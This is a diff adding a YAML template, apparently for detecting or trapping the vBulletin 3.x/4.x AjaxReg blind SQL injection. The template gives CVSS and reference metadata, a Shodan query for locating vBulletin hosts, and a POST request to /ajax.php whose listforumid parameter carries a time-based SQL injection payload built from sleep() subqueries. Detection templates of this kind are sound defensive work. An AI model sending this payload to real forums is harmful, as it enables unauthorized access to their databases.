@@ -1,0 +1,33 @@
+id: vbulletin-ajaxreg-sqli
+info:
+  name: vBulletin 3.x / 4.x AjaxReg - SQL Injection
+  author: MaStErChO
+  description: 'vBulletin versions 3.x and 4.x suffer from an AjaxReg remote blind
+    SQL injection vulnerability.
+
+    '
+  severity: critical
+  reference:
+  - https://packetstormsecurity.com/files/118703/vBulletin-3.x-4.x-AjaxReg-SQL-Injection.html
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 9.8
+    cwe-id: CWE-89
+  metadata:
+    verified: true
+    max-request: 1
+    shodan-query: http.component:"vBulletin"
+  tags: packetstorm,vbulletin,ajaxreg,sqli
+traps:
+- request:
+    method: POST
+    path: /ajax.php?do=inforum&listforumid=(select(0)from(select(sleep(6)))v)/*'%2B(select(0)from(select(sleep(6)))v)%2B'"%2B(select(0)from(select(sleep(6)))v)%2B"*/&result=10
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: 'undefined&s=&securitytoken=guest
+
+      '
+  response:
+    status_code: 200
+    headers: {}
+    body: ''
